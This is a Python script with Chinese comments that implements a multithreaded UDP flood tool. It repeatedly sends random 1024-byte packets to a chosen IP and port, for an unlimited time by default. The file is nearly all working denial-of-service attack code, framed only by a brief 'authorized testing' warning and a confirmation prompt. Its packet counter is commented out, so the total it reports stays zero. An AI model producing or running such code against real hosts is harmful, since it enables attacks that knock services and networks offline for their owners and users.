import socket
import threading
import time
import random
import sys
import argparse
from datetime import datetime

class UDPFloodTester:
    def __init__(self, target_ip, target_port, duration=0, threads=1):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration  # 0表示无限运行
        self.threads = threads
        self.packets_sent = 0
        self.running = False
        self.lock = threading.Lock()
        
    def send_udp_packets(self, thread_id):
        """单个线程的UDP数据包发送函数"""
        try:
            # 创建UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # 生成随机数据包内容
            data = random._urandom(1024)  # 1024字节的随机数据[1](@ref)
            
            thread_packets = 0
            start_time = time.time()
            
            print(f"[线程{thread_id}] 开始发送UDP数据包到 {self.target_ip}:{self.target_port}")
            
            while self.running:
                try:
                    # 发送UDP数据包[1,3](@ref)
                    sock.sendto(data, (self.target_ip, self.target_port))
                    thread_packets += 1
                    
                    # 每100个包输出一次进度
                    # if thread_packets % 100 == 0:
                    #     with self.lock:
                    #         self.packets_sent += 100
                        # print(f"[线程{thread_id}] 已发送 {thread_packets} 个数据包")
                        
                except Exception as e:
                    print(f"[线程{thread_id}] 发送错误: {e}")
                    break
            
            sock.close()
            print(f"[线程{thread_id}] 结束，共发送 {thread_packets} 个数据包")
            
        except Exception as e:
            print(f"[线程{thread_id}] 异常: {e}")

    def start_attack(self):
        """启动UDP泛洪攻击"""
        print("=" * 50)
        print("UDP泛洪攻击测试工具启动")
        print(f"目标: {self.target_ip}:{self.target_port}")
        print(f"线程数: {self.threads}")
        print(f"持续时间: {self.duration}秒" if self.duration > 0 else "持续时间: 无限")
        print("开始时间:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        print("=" * 50)
        
        self.running = True
        self.packets_sent = 0
        threads = []
        
        # 创建并启动所有线程[4](@ref)
        for i in range(self.threads):
            thread = threading.Thread(target=self.send_udp_packets, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # 控制运行时间
        try:
            if self.duration > 0:
                # 有限时间运行
                time.sleep(self.duration)
                self.running = False
                print(f"\n达到设定时间 {self.duration} 秒，停止攻击")
            else:
                # 无限运行，等待键盘中断
                print("攻击无限运行中，按 Ctrl+C 停止...")
                while True:
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            print("\n收到中断信号，停止攻击")
            self.running = False
        
        # 等待所有线程结束
        for thread in threads:
            thread.join(timeout=5)
        
        # 输出最终统计
        print("=" * 50)
        print("攻击结束")
        print("结束时间:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        print(f"总发送数据包数量: {self.packets_sent}")
        print("=" * 50)

def main():
    """主函数：处理命令行参数并启动攻击"""
    parser = argparse.ArgumentParser(description='UDP泛洪攻击测试工具')
    parser.add_argument('ip', type=str, help='目标IP地址')
    parser.add_argument('port', type=int, help='目标端口号')
    parser.add_argument('-t', '--time', type=int, default=0, 
                       help='攻击持续时间(秒)，0表示无限运行')
    parser.add_argument('-n', '--threads', type=int, default=10, 
                       help='线程数量，默认10个线程[4](@ref)')
    
    args = parser.parse_args()
    
    # 输入确认
    print("⚠️  警告：此工具仅用于授权的安全测试！")
    print(f"目标: {args.ip}:{args.port}")
    print(f"持续时间: {args.time}秒" if args.time > 0 else "持续时间: 无限")
    print(f"线程数: {args.threads}")
    
    confirm = input("确认开始攻击？(y/N): ")
    if confirm.lower() != 'y':
        print("操作取消")
        return
    
    # 创建并启动攻击器
    tester = UDPFloodTester(args.ip, args.port, args.time, args.threads)
    tester.start_attack()

if __name__ == "__main__":
    main()